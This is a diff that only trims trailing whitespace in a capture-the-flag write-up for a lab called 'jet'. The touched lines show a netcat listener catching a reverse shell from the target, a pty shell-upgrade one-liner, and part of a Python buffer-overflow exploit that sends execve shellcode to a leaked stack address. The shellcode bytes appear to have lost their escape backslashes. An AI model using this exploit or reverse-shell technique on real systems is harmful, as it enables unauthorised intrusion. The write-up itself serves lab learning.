@@ -814,13 +814,13 @@ Boom, we get a shell. Let's stabilize our shell.
 ```bash
 kali@kali:nc -nlvp 1277
 
-listening on [any] 1277 ...                                                                                                                                 
-connect to [10.10.16.65] from (UNKNOWN) [10.13.37.10] 46436                                                                                                 
-bash: cannot set terminal process group (991): Inappropriate ioctl for device            
-bash: no job control in this shell                                                                                                                         
-www-data@jet:~/html/dirb_safe_dir_rf9EmcEIx/admin$ python3 -c 'import pty; pty.spawn ("/bin/bash")'                                                         
-<fe_dir_rf9EmcEIx/admin$ python3 -c 'import pty; pty.spawn ("/bin/bash")'                                                                                   
-www-data@jet:~/html/dirb_safe_dir_rf9EmcEIx/admin$  
+listening on [any] 1277 ...
+connect to [10.10.16.65] from (UNKNOWN) [10.13.37.10] 46436
+bash: cannot set terminal process group (991): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@jet:~/html/dirb_safe_dir_rf9EmcEIx/admin$ python3 -c 'import pty; pty.spawn ("/bin/bash")'
+<fe_dir_rf9EmcEIx/admin$ python3 -c 'import pty; pty.spawn ("/bin/bash")'
+www-data@jet:~/html/dirb_safe_dir_rf9EmcEIx/admin$
 ```
 
 Inside of home directory, we find a binary called leak, let's bring it to our attack machine and analyze.
@@ -937,16 +937,16 @@ print(hex(leak))
 shellcode = (
    b"x31xc0x48xbbxd1x9dx96x91xd0x8cx97xff"
    b"x48xf7xdbx53x54x5fx99x52x57x54x5e"
-   b"xb0x3bx0fx05"                                                                                                                                      
+   b"xb0x3bx0fx05"
 )
 
-payload  = shellcode                                                                                                                                         
-payload += b"x90" * (72 - len(shellcode))                                                                                                                   
+payload  = shellcode
+payload += b"x90" * (72 - len(shellcode))
 payload += struct.pack("<Q", leak)
 
 s.sendall(payload + b"n")
-                                                                                                                                                            
-# proper interactive shell                                                                                                                                   
+
+# proper interactive shell
 while True:
    r, _, _ = select.select([s, sys.stdin], [], [])
    if s in r:
@@ -1806,4 +1806,5 @@ This is the final flag, i.e. flag11
 *Flag11:JET{7.....7}*
 
 With this we wrap up the challenge. It took longer that expected because of too many pwn based ctf.
+
 
